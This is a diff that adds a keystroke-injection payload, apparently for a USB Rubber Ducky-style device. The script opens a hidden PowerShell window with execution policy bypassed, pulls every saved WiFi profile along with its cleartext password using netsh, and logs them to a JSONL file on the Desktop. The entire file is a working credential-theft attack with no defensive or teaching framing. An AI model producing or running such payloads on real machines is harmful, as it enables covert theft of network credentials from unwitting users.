@@ -1,0 +1,25 @@
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+STRING $pr = netsh wlan show profiles | Select-String "\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}; `
+ENTER
+DELAY 500
+
+STRING foreach($p in $pr){ $d = netsh wlan show profile name="$p" key=clear | Out-String; $a="None"; $k="None"; `
+ENTER
+DELAY 500
+
+STRING if($d -match "Authentication\s*:\s*(.+)"){$a=$Matches[1].Trim()}; if($d -match "Key Content\s*:\s*(.+)"){$k=$Matches[1].Trim()}; `
+ENTER
+DELAY 500
+
+STRING [PSCustomObject]@{Category='WiFi';Timestamp=(Get-Date -Format 'o');Payload=@{SSID=$p;Auth=$a;Key=$k}} | ConvertTo-Json -Compress | Out-File "$env:USERPROFILE\Desktop\WiFi_Only.jsonl" -Append -Encoding utf8 }
+ENTER
+DELAY 200
+
+STRING exit
+ENTER
